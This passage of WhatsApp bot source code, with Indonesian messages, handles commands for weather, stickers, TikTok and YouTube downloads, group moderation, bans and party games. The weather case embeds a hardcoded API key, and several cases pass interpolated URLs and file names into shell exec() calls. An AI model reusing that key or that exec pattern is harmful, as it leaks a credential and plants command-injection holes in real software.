{buttonId: `${prefix}console on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}console off`, buttonText: { displayText: Off },type: 1}]);
 }
 }
break


case 'weather':{
if(!args[0]) setReply(" please provide place or location name")
try{
let response = axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args[0]}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`)
let res = await response
let name = res.data.name
let Country = res.data.sys.country
let Weather= res.data.weather[0].description
let Temperature = res.data.main.temp + '°C'
let Minimum_Temperature= res.data.main.temp_min + '°C'
let Maximum_Temperature= res.data.main.temp_max + '°C'
let Humidity= res.data.main.humidity + '%'
let Wind= res.data.wind.speed + 'km/h'
setReply(`🌸 Place: ${name}\n💮 Country: ${Country}\n🌈 Weather: ${Weather}\n🎋 Temperature: ${Temperature}\n💠 Minimum Temperature: ${Minimum_Temperature}\n📛 Maximum Temperature: ${Maximum_Temperature}\n💦 Humidity: ${Humidity}\n🎐 Wind: ${Wind}`)
}catch(e){
setReply('Lokasi tidak di temukan, silakan masukan nama negara')
 }
 }
break


case 'triggered':
case 'wasted':
case 'comrade':
case 'horny':
case 'blur':
case 'pixelate':
case 'simpcard':
case 'lolice':
case 'glass':
if (isQuotedVideo && dev.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage.fileLength < 10000000 || isQuotedImage || isImage) {
setReply(mess.wait)

try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await xdev.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let media = `https://some-random-api.ml/canvas/${command}?avatar=${anuah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)

} catch (err){  
let owgi = await xdev.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(owgi)
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
let anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await xdev.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: dev})
await fs.unlinkSync(owgi)
await fs.unlinkSync(ranp)
await fs.unlinkSync(rano)
})
}
  
} else if (isQuotedText) {
setReply(mess.wait)

try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await xdev.profilePictureUrl(mentionByReply, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png') 
let media = `https://some-random-api.ml/canvas/${command}?avatar=${olalah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)

} catch (err){  
console.log(err)
let oppp = await xdev.profilePictureUrl(mentionByReply, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${oppp}`
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await xdev.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: dev})
await fs.unlinkSync(oppp)
await fs.unlinkSync(ranp)
await fs.unlinkSync(rano)
})
}
}  else {
setReply('Gunakan foto!')
}
break 



case 'yts':
try {
if (!q) return setReply('Format salah')
setReply('Tunggu sebentar')
let rus = await yts(q)
let  res = await rus.all.filter(v => v.type == 'video')
let videoID = res[0].videoId

try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let a = `*Youtube Search 🔎*\n`
for (let i of res) {
a += `
📜 Title : ${i.title}
📈 Views : ${i.views}
🌐 Upload : ${i.ago}
⏱️ Durasi : ${i.timestamp}
🎥 Channel : ${i.author.name}
🖇️ Link : ${i.url}\n\n`
}
let b = a.trim()

let imag = await getBuffer(res[0].image)
let mok = [{"buttonId": `${prefix}playmp3 ${res[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}playmp4 ${res[0].url}`,"buttonText": {"displayText": `ᴠɪᴅᴇᴏ`},"type": "RESPONSE"}]
xdev.sendButImage(from, b, `Baterai : Not Detec\ncopyright`, imag, mok, {quoted: dev})
 } catch (e) {
 console.log(e)
 setReply(`${e}`)
}
break  

case 'setppbot':
                if(isQuotedImage){
                const media = await conn.downloadAndSaveMediaMessage(quoted)
                const { img } = await generateProfilePicture(media)
                await conn.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})       
await setReply("Sukses")    
      } else setReply("Reply fotonya")
                break

case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isOwner && !isGroupAdmins) return setReply(mess.only.Admin)
if(isQuotedImage){
const media = await conn.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await conn.query({ tag: 'iq',  attrs: { to : from, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})       
await setReply("Sukses")    
} else setReply("Reply fotonya")
}
break

case 'tagme': {
if (!isGroup) return setReply(mess.only.group) 
let menst = [sender]
xdev.sendMessage(from, { text: `@${senderNumber}`, mentions: menst }) 
}
break
case 'totag': {
if (!isGroup) return setReply(mess.only.group) 
if (!mentionByReply) return setReply("reply targetnya") 
let menst = [mentionByReply]
xdev.sendMessage(from, { text: `@${mentionByReply.split('@')[0]}`, mentions: menst }) 
}
break
case 'reqtag': {
if (!isGroup) return setReply(mess.only.group) 
if (!mentionByReply) return setReply("Reply targetnya")
if (!q) return setReply("Text?") 
let menst = [mentionByReply]
xdev.sendMessage(from, { text: `${q} @${mentionByReply.split('@')[0]}`, mentions: menst }) 
}
break
    
case 'bc': 
if (!isOwner) return onlyOwner()
if (args.length < 2) return reply(`Masukkan isi pesannya`)
var data = await store.chats.all()
for (let i of data) {
await xdev.sendMessage(i.id, { text: `${q}\n\n_*BROADCAST MESSAGE*_` })
await sleep(1000)
}
break


case 'antiasing':{
if (!isGroup) return setReply('Kusus group')
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
 if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isKickarea) return setReply("Sudah aktif!!");
addDataId(from, command, DataId)
setReply("Sukses mengaktifkan kickarea!");
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isKickarea) return setReply("Udah off!!");
removeDataId (command, from, DataId)
setReply("Sukses mematikan kickarea!");
} else if (!q) {
xdev.sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, 
[{buttonId: `${prefix}kickarea on`, buttonText: { displayText: `on`,},type: 1,},
{buttonId: `${prefix}kickarea off`, buttonText: { displayText: `off`,}, type: 1}, ]);
 }
 }
break;
					



case 'antilinkgc':{
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isGroup) return setReply('hanya bisa di group')
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur antilink group telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntilinkGc) return setReply('Udah mati')
removeDataId (command, from, DataId)
let ih =`Fitur antilink group telah di matikan`
setReply(ih)
}else if (!q) {
xdev.sendButMessage(from, `MODE ANTI LINK GROUP`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}antilinkgc on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: Off },type: 1}]);
 }
 }
break;  


case 'antilink':{
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isGroup) return setReply('hanya bisa di group')
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntiLink) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur antilink telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntiLink) return setReply('Fitur Anti link sudah off')
removeDataId (command, from, DataId)
let ih =`Fitur antilink telah di matikan`
setReply(ih)
} else if (!q) {
xdev.sendButMessage(from, `MODE ANTI LINK`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}antilink on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antilink off`, buttonText: { displayText: Off },type: 1}]);
}
}
break;      





case 'banchat':{
if (!isOwner) return onlyOwner()
if (!isGroup) return setReply(mess.only.group)
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if (isBanchat) return setReply(`udah di ban`)
addDataId(from, command, DataId)
setReply(`Bot berhasil Ban di group ini`)
}
break

case 'unbanchat':
if (!isOwner) return onlyOwner() 
try {
if (!isBanchat) return setReply(`udah di UnBan`)
removeDataId ("banchat", from, DataId)
setReply(`Bot telah di Unban di group ini`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break
			

case 'whatanime':{
const FormData = require('form-data')
if (isImage || isQuotedImage) {       
let yoooo = await xdev.downloadAndSaveMediaMessage(quoted)
let bodyForm = new FormData();
bodyForm.append('image', fs.createReadStream(yoooo)) 
fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
.then(async(res) =>{
if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
let teks = ''
if (res.result[0].similarity < 0.92) {
teks += '*Low similarity. 🤔*\n\n'
}
teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
await xdev.sendMessage(from, {caption: teks, video: {url : res.result[0].video}}, {quoted: dev})
})    .catch((err) => {                   
setReply(mess.error.api)
})
} else if (isSticker || isQuotedSticker ) {
let yoooo = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
fs.unlinkSync(yoooo)
if (err) return setReply('Gagal :V')   
let bodyForm = new FormData();
bodyForm.append('image', fs.createReadStream(ran)) 
fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
.then(async(res) =>{
if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
let teks = ''
if (res.result[0].similarity < 0.92) {
teks += '*Low similarity. 🤔*\n\n'
}
teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
await xdev.sendMessage(from, {caption: teks, video: {url : res.result[0].video}}, {quoted: dev})
fs.unlinkSync(ran)
})
.catch((err) => {       
setReply(mess.error.api)
 })
 })
 } else {
setReply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
}
}
break


case 'getidgc':
if(!isGroup) return setReply("Hanya bisa di group")
setReply(`${from}`)
break


case 'brainly':{
 const { Brainly } = require("brainly-scraper-v2");
const brainly = new Brainly("id"); 
if (!q) setReply( 'Soalnya?')
let nana =`https://www.logosvgpng.com/wp-content/uploads/2018/04/brainly-logo-vector.png`
let foto = await getBuffer(nana)   
/*
try{
  var res = await brainly.search('id', q)
} catch (err) {
var res = await brainly.searchWithMT('id', `${q}`)
}
*/
let res = await brainly.searchWithMT(`${q}`, `id`)
console.log(res)
let teks =`_*BRAINLY*_\n\n`


   teks += res.map(({ question, answers }, i) => `
_*PERTANYAAN KE ${i + 1}*_
${question.content}${answers.map((v, i) => `

*JAWABAN KE ${i + 1}*${v.verification ? ' (Verified)' : ''}${v.isBest ? ' (Terpilih)' : ''}
${v.content}`).join``}`).join(`
═════════════════
`)
 
 teks +=`\n\n_Thanks for choosing Brainly_`
 
let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}donasi`,"buttonText": {"displayText": `ᴅᴏɴᴀsɪ`},"type": "RESPONSE"}]
xdev.sendButImage(from, teks, `© ${fake1}`, foto, mok, {contextInfo: forward})             

}
break
  





    
case 'user':
setReply('user saat ini ')
break

                      
case  'tiktokmusik':{       
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
setReply(mess.wait)
tiktokdlv2(lin).then( async res => {
let ep = res.video.no_watermark                    
let nana = await getBuffer(ep)
let ran = getRandom('.mp3')
let ron = getRandom('.mp4')
fs.writeFileSync(ron, nana)
exec(`ffmpeg -i ${ron} -vn ${ran}`, (err) => {
fs.unlinkSync(ron)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
xdev.sendMessage(from, { audio: buffer453, mimetype: 'audio/mp4'}, { quoted: dev })
fs.unlinkSync(ran)
})
})
}
 break
                        
  
case 'tiktoknowm': 
case 'tiktok':
case 'tt':{   
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
setReply(mess.wait)
tiktokdlv2(lin).then(res => {
let buttons = [
{"buttonId": `${prefix}tiktokmusik ${args[0]} `,"buttonText": {"displayText": `audio`},"type": "RESPONSE"}]
let ep = res.video.no_watermark
 console.log(ep)
xdev.sendMessage(from, {caption: "Nih", video: {url: ep}, buttons},{quoted: dev})
 })
 }
 break
                      
                    
                    
                    
case 'unblockcmd':
try{
if (!isOwner) return onlyOwner()
if(!q) return setReply("Textnya mana cih")
if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
deleteblockcmd(q, listcmdblock)        
setReply(`Berhasil unblock command 「 *${q}* 」`)
} catch (err) {
setReply("Bjirr error, keknya ada yang error")
}
break  
            
case 'blockcmd':
if (!isOwner) return onlyOwner()
if(!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
addblockcmd(q,listcmdblock)         
setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)          
break


case 'listblockcmd':{
let wo = `*「 LIST BLOCK CMD 」*`
let soso = [];
for (let i of listcmdblock) {
soso.push(i.cmd)
wo += `\n\n•> Command : ${i.cmd}`
}
setReply(wo)
}
break  


case 'infogc': {
if(!isGroup) return setReply("Hanya bisa di dalam group")
let _meta = await xdev.groupMetadata(from)
  console.log(_meta)
let _img = await xdev.profilePictureUrl(_meta.id, 'image') 
let caption = `${_meta.subject} - Created on ${moment(_meta.creation * 1000).format('ll')}\n\n` +
`*${_meta.participants.length}* Total Members\n*${_meta.participants.filter(x => x.admin === 'admin').length}* Admin\n*${_meta.participants.filter(x => x.admin === null).length}* Not Admin\n\n` +
`Group ID : ${_meta.id}`
await xdev.sendMessage(from,{
caption,
image: await getBuffer(_img)
},
{ quoted: dev }
)
}
break

case 'info':{
const si = require('systeminformation');
let OsInfo = await si.osInfo()
let System = await si.system()
let Cpu = await si.cpu()
let Mem = await si.mem()

let {platform,distro,release,codename,kernel,arch,hostname,fqdn,codepage,logofile} = OsInfo
let { manufacturer,brand,vendor,family,model,stepping,revision,voltage,speed,speedMin,speedMax,governor,cores,physicalCores,processors} = Cpu
let { total,free,used,active,available,buffers,cached,slab,buffcache} = Mem

let teks =`System Information`
 teks +=`

Uptime : ${kyun(os.uptime())}

*OS INFO*
Platform: ${platform}
Distro: ${distro}
Release: ${release}
Codename: ${codename}
Kernel: ${kernel}
Arch: ${arch}
Hostname: ${hostname}
Codepage: ${codepage}

*CPU INFO*
Manufacturer: ${manufacturer}
Brand: ${brand}
Vendor: ${vendor}
Family: ${family}
Model: ${model}
Speed: ${speed} Ghz
Governor: ${governor}
Cores: ${cores}
PhysicalCores: ${physicalCores}
Processors: ${processors}

*MEMORY INFO*
Memory : ${FileSize(used)}/${FileSize(total)} 
Free : ${FileSize(free)}
Cached: ${FileSize(cached)}
`
setReply(teks)
 }    
break    

    


case 'setprefix':
    {
if (!isOwner) return onlyOwner()
let teks =`SETTING PREFIX\n\nSilakan masukkan prefix\nOptions :\n=> multi\n=> nopref\n=> allpref`
if (q === 'multi'){
multi = true
nopref = false
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (q === 'nopref'){
multi = false
nopref = true
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (q === 'allpref'){
multi = false
nopref = false
allpref = true
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (!q) {
xdev.sendButMessage(from, teks, copyright, [
{buttonId: `${prefix}setprefix multi`, buttonText: {displayText: `ᴍᴜʟᴛɪ`},type: 1},
{buttonId: `${prefix}setprefix nopref`, buttonText: {displayText: `ɴᴏᴘʀᴇғ`},type: 1},
{buttonId: `${prefix}setprefix allpref`, buttonText: { displayText: `ᴀʟʟᴘʀᴇғ`},type: 1}]);
 } else {
multi = false
nopref = false
prefa = `${q}`
setReply(`Berhasil anying mengubah prefix ke *「 ${q} 」*`)
 } 
}
break  


case 'setreply':{
if(!isOwner) return onlyOwner()
if ((args[0]) === 'web'|| (args[0]) === 'situs' ){
if(replyType === "web") return setReply("Udah aktif")
replyType = "web"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'mess'){
if(replyType === "mess") return setReply("Udah aktif")
replyType = "mess"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'troli' ){
if(replyType === "troli") return setReply("Udah aktif")
replyType = "troli"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'quoted' ){
if(replyType === 'quoted') return setReply("Udah aktif")
replyType = "quoted"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (!q) {
xdev.sendButMessage(from, `SETTING REPLY\n1. web\n2. troli\n3. mess\n4. vidio\n5. quoted\n`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setreply web`, buttonText: {displayText: `ᴡᴇʙ`},type: 1},
{buttonId: `${prefix}setreply troli`, buttonText: {displayText: `ϙᴜᴏᴛᴇᴅ`},type: 1},
{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `ᴍᴇss`},type: 1}]);
 } else {
replyType = q
 setReply("Set Reply Tidak Di Temukan")
}
}
break









case 'take':
if (isImage || isQuotedImage|| isQuotedSticker) {
try{
let ahuh = args.join(' ').split('|')
let satu = ahuh[0] !== '' ? ahuh[0] : `EXTREAM`
let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: satu, // The pack name
author: dua, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await xdev.sendMessage(from,{sticker: nah},{quoted: dev})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
console.log(err)
}
}
break

case 'givelimit':{
if(!q) return setReply("Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
giveLimit(mentionByReply.split("@")[0], math(q), user)
setReply(`Berhasil menambakan limit ke nomer ${mentionByReply.split("@")[0]}`)
}
break


case 'setwelcome':{
    if ((args[0]) === 'type1' ) {
    if(setwelcome === "type1") return setReply("Udah aktif")
    setwelcome = "type1"
    setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
    } else if ((args[0]) === 'type2' ) {
    if(setwelcome === "type2") return setReply("Udah aktif")
    setwelcome = "type2"
    setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
    } else if ((args[0]) === 'type3' ) {
   if(setwelcome === "type3") return setReply("Udah aktif")
    setwelcome = "type3"
    setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
    } else if(!q){
    setReply("Pilih setwelcome : type1 atau type2 atau type3")
    } else {
    setReply("Query tidak di temukan")
    }
    }
    break




case 'ban':{
if (!isOwner)return setReply(mess.only.owner) 
if (q.startsWith("+")) {
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
let Name = await xdev.getName(woke)
console.log(woke)
if(cekBannedUser (woke, ban)) return setReply("Udah di ban kak")
addBanned(Name,calender,  woke, ban)          
setReply( `Berhasil banned ${woke}`);
} else  if(users){
let Nomer =`${users.split("@")[0]}`
if(cekBannedUser (Nomer, ban)) return setReply("Udah di ban kak")
let Name = await xdev.getName(users)
//if(Nomer === ownerNumber[0]) return setReply("Ga mau")
addBanned(Name,calender,  Nomer, ban)               
setReply( `Berhasil banned ${users.split("@")[0]}`);
} else setReply('Reply atau tag targetnya')
}
break


case 'unban':{
if (!isOwner)return setReply(mess.only.owner) 
if (q.startsWith("+")) {
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
if(!cekBannedUser (woke, ban)) return setReply("Udah di unban kak")
unBanned (woke, ban)             
setReply( `Berhasil unbanned ${woke}`);
} else  if(users){
let Nomer =`${users.split("@")[0]}`
if(!cekBannedUser (Nomer, ban)) return setReply("Udah di unban kak")
//if(Nomer === Ownerin) return setReply("Ga mau")
unBanned (Nomer, ban)             
setReply( `Berhasil unbanned ${users.split("@")[0]}`);
} else setReply('Reply atau tag targetnya')
}
break

case 'listban':
//if (!isOwner) return onlyOwner()
let banya = `*List Banned*\nJumlah : ${JSON.parse(fs.readFileSync('./database/banned.json')).length}\n\n`
JSON.parse(fs.readFileSync('./database/banned.json')).map(function(e, i){
banya += (i+1)+`📲 Nomer : wa.me/${e.id}\n    📅 Tanggal : ${e.date}\n\n`            
 });
setReply(banya)
break

case 'adderror':
{
if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
if (!dev.key.fromMe && !isOwner) return reply (mess.only.ownerB)
let oke = q.split("|")[0]
let oka = q.split("|")[1]
addError(oke, oka, listerror)
await setReply(`Sukses Menambahkan ${q} ke daftar error`)
}
break


case 'clearallerror':
if (!isOwner) return onlyOwner()
setReply("SukseS clear all error")
clearAllError(listerror)
break 

case 'delerror':{
if (!itsMe && !isOwner) return reply (mess.only.ownerB)
listerror.splice(q, 1)
fs.writeFileSync('./database/listerror.json', JSON.stringify(listerror))
setReply( `Sukses menghapus ${q} di daftar error`)
}
break

case 'listerror': {
let errornye = `*List Error*\nJumlah : ${JSON.parse(fs.readFileSync('./database/listerror.json')).length}\n\n`
for (let i of JSON.parse(fs.readFileSync('./database/listerror.json'))){          
errornye += `_*Command*_ : ${i.cmd}\n_*System Error*_ : ${i.error}\n\n*]─────────────────[*\n\n`             
} 
errornye += `© ${fake1}`
setReply(errornye)
}
break
case 'addcmd': 
			case 'setcmd':{
                  if (!isOwner) return setReply(mess.only.owner)
                  if (isQuotedSticker) {
                  if (!q) return setReply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                  addCmd(kodenya, q)
                  setReply("Success")
                  } else {
                  setReply('tag stickenya')
                  }
                  }
            break

//━━━━━━━━━━━━━━━[ FUN ]━━━━━━━━━━━━━━━━━//
case 'cekbapak':
const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk']
const cek = bapak[Math.floor(Math.random() * bapak.length)]
setReply(cek)
break
case 'truth':
const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
const ttrth = trut[Math.floor(Math.random() * trut.length)]
setReply(ttrth) 
break
case 'dare':
const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
const der = dare[Math.floor(Math.random() * dare.length)]
setReply(der) 
break
case 'katailham':  
const afa = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
xdev.sendMessage(from, { text: ''+afa+'\n\n_-Ilham._'}, { quoted: setQuoted })
break
case 'bucin':
const sa = ngebucin[Math.floor(Math.random() * ngebucin.length)]
xdev.sendMessage(from, { text: ''+sa+'\n\n_-BUCIN._'}, { quoted: setQuoted })
break
case 'bisakah':
const bisakah = body.slice(0)
const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😄','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 🙂','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
const keh = bisa[Math.floor(Math.random() * bisa.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh }, { quoted: setQuoted })
break
case 'kapankah':
const kapankah = body.slice(0)
const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
const koh = kapan[Math.floor(Math.random() * kapan.length)]
xdev.sendMessage(from, { text: 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh}, { quoted: setQuoted })
break
case 'apakah':
const apakah = body.slice(0)
